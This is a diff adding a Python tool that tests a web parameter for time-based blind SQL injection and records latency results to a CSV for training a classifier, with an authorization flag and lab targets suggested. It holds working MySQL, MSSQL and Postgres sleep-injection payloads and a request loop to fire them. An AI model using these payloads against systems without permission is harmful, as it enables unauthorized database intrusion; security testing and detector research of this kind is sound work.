@@ -1,0 +1,216 @@
+#!/usr/bin/env python3
+"""
+Time-based blind SQL injection detector and dataset builder.
+
+AUTHORIZED USE ONLY
+-------------------
+Run this only against systems you own or have explicit, written permission to
+test, e.g. a local DVWA or Mutillidae lab. There is no default target: you must
+pass --url and the --authorized acknowledgement flag, so the tool can never fire
+at something by accident.
+
+What it does
+------------
+Sends a catalog of payloads to one request parameter, measures response latency
+against a per-target baseline, and records observations to a CSV suitable for
+training a response classifier. Detection is based purely on measured timing, so
+the ground-truth label is not derived from the payload's own class (see NOTE).
+
+Dependencies: requests  (pip install requests)
+"""
+
+import argparse
+import csv
+import random
+import statistics
+import sys
+import time
+from datetime import datetime, timezone
+
+try:
+    import requests  # the original script used requests but never imported it
+except ImportError:
+    sys.exit("This tool requires the 'requests' package: pip install requests")
+
+
+# --- Payload catalog -------------------------------------------------------
+# expected_delay is the sleep (seconds) the payload attempts to induce.
+PAYLOADS = [
+    {"text": "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)", "family": "mysql-inline",  "is_malicious": 1, "expected_delay": 5},
+    {"text": "1' AND (SELECT 5 FROM (SELECT(SLEEP(5)))x)--", "family": "mysql-quote", "is_malicious": 1, "expected_delay": 5},
+    {"text": "1; WAITFOR DELAY '0:0:5'--",                  "family": "mssql",         "is_malicious": 1, "expected_delay": 5},
+    {"text": "admin' OR pg_sleep(5)--",                     "family": "postgres",      "is_malicious": 1, "expected_delay": 5},
+    # Benign controls: these should never be flagged. If they are, your
+    # threshold is too low or the target is unstable.
+    {"text": "1",        "family": "benign", "is_malicious": 0, "expected_delay": 0},
+    {"text": "25",       "family": "benign", "is_malicious": 0, "expected_delay": 0},
+    {"text": "78",       "family": "benign", "is_malicious": 0, "expected_delay": 0},
+    {"text": "username", "family": "benign", "is_malicious": 0, "expected_delay": 0},
+]
+
+
+def measure_once(session, url, param, value, timeout):
+    """One request. Returns (latency_seconds, status_code, body_len).
+
+    On timeout, latency is reported as the timeout bound and status as 504.
+    """
+    start = time.perf_counter()
+    try:
+        resp = session.get(url, params={param: value}, timeout=timeout)
+        latency = time.perf_counter() - start
+        return latency, resp.status_code, len(resp.text)
+    except requests.Timeout:
+        return float(timeout), 504, 0
+
+
+def establish_baseline(session, url, param, iterations, timeout):
+    """Measure normal latency and body size to resist jitter-driven false positives."""
+    print(f"[*] Baselining target over {iterations} requests...")
+    times, sizes = [], []
+    for _ in range(iterations):
+        try:
+            latency, status, size = measure_once(
+                session, url, param, random.randint(1, 100), timeout
+            )
+        except requests.RequestException:
+            continue
+        if status == 504:
+            continue
+        times.append(latency)
+        sizes.append(size)
+
+    if not times:
+        raise ConnectionError("Could not reach the target to establish a baseline.")
+
+    baseline = {
+        "avg_time": statistics.mean(times),
+        "std_dev_time": statistics.stdev(times) if len(times) > 1 else 0.1,
+        "avg_size": statistics.mean(sizes),
+        "samples": len(times),
+    }
+    print(
+        f"[+] Baseline: avg={baseline['avg_time']:.4f}s "
+        f"stddev={baseline['std_dev_time']:.4f}s "
+        f"avg_size={baseline['avg_size']:.0f}B (n={baseline['samples']})"
+    )
+    return baseline
+
+
+def run_fuzzing_cycle(session, url, param, baseline, payloads, args):
+    """Execute payloads and classify by measured timing (label-independent)."""
+    rows = []
+    # A hit needs a clear multi-second delay AND to clear the jitter band.
+    jitter_band = baseline["avg_time"] + args.sigma * baseline["std_dev_time"]
+
+    print("\n[*] Starting active test cycle...")
+    for item in payloads:
+        payload = item["text"]
+
+        # Measure the payload a few times and take the median to resist jitter.
+        latencies, status, size = [], None, None
+        for _ in range(args.repeats):
+            try:
+                latency, status, size = measure_once(
+                    session, url, param, payload, args.timeout
+                )
+            except requests.RequestException as exc:
+                print(f"[-] Request error on {payload[:24]!r}: {exc}")
+                latency = None
+                break
+            latencies.append(latency)
+            time.sleep(args.pause)
+
+        if not latencies:
+            continue
+
+        median_latency = statistics.median(latencies)
+        observed_delay = median_latency - baseline["avg_time"]
+
+        # NOTE: detection is derived only from timing, not from is_malicious.
+        # A payload is flagged when the induced delay is both large in absolute
+        # terms (min_delay) and well outside normal jitter (jitter_band).
+        detected = median_latency >= max(jitter_band, baseline["avg_time"] + args.min_delay)
+
+        # Relationship to the labelled class, for evaluation only.
+        if detected and item["is_malicious"]:
+            outcome = "true_positive"
+        elif detected and not item["is_malicious"]:
+            outcome = "false_positive"
+        elif not detected and item["is_malicious"]:
+            outcome = "false_negative"
+        else:
+            outcome = "true_negative"
+
+        print(
+            f"{payload:<45} | status={status} "
+            f"| median={median_latency:6.2f}s | delay={observed_delay:+6.2f}s "
+            f"| detected={int(detected)} | {outcome}"
+        )
+
+        rows.append({
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "target_url": url,
+            "target_param": param,
+            "fuzzed_input_payload": payload,
+            "payload_family": item["family"],
+            "server_response_status": status,
+            "server_response_length": size,
+            "observed_latency_seconds": round(median_latency, 4),
+            "latency_delta_seconds": round(observed_delay, 4),
+            "size_delta_bytes": int(size - baseline["avg_size"]),
+            "repeats": len(latencies),
+            "is_malicious_payload": item["is_malicious"],   # input label
+            "time_delay_detected": int(detected),            # timing-only signal
+            "eval_outcome": outcome,                          # label vs detection
+        })
+    return rows
+
+
+def save_dataset(rows, filename):
+    if not rows:
+        print("[-] No rows collected; nothing written.")
+        return
+    with open(filename, "w", newline="", encoding="utf-8") as fh:
+        writer = csv.DictWriter(fh, fieldnames=list(rows[0].keys()))
+        writer.writeheader()
+        writer.writerows(rows)
+    print(f"\n[+] Logged {len(rows)} observations to {filename!r}")
+
+
+def parse_args(argv=None):
+    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
+    p.add_argument("--url", required=True, help="Target URL, e.g. http://localhost:8080/api/users")
+    p.add_argument("--param", default="id", help="Request parameter to fuzz (default: id)")
+    p.add_argument("--output", default="blind_sqli_dataset.csv", help="CSV output path")
+    p.add_argument("--baseline-iterations", type=int, default=10, help="Baseline requests (default: 10)")
+    p.add_argument("--repeats", type=int, default=2, help="Measurements per payload; median is used (default: 2)")
+    p.add_argument("--sigma", type=float, default=3.0, help="Jitter band width in stddevs (default: 3)")
+    p.add_argument("--min-delay", type=float, default=2.0,
+                   help="Minimum absolute added delay (s) to count as a hit (default: 2)")
+    p.add_argument("--pause", type=float, default=0.5, help="Seconds between requests (default: 0.5)")
+    p.add_argument("--timeout", type=float, default=15.0, help="Per-request timeout (s); keep it > max sleep")
+    p.add_argument("--authorized", action="store_true",
+                   help="Required. Affirms you are authorized to test --url.")
+    return p.parse_args(argv)
+
+
+def main(argv=None):
+    args = parse_args(argv)
+    if not args.authorized:
+        sys.exit("Refusing to run without --authorized. Only test systems you own or may test.")
+
+    session = requests.Session()
+    try:
+        baseline = establish_baseline(
+            session, args.url, args.param, args.baseline_iterations, args.timeout
+        )
+        rows = run_fuzzing_cycle(session, args.url, args.param, baseline, PAYLOADS, args)
+        save_dataset(rows, args.output)
+    except KeyboardInterrupt:
+        print("\n[-] Interrupted by user.")
+    except Exception as exc:  # noqa: BLE001 - top-level guard
+        sys.exit(f"[!] Critical error: {exc}")
+
+
+if __name__ == "__main__":
+    main()
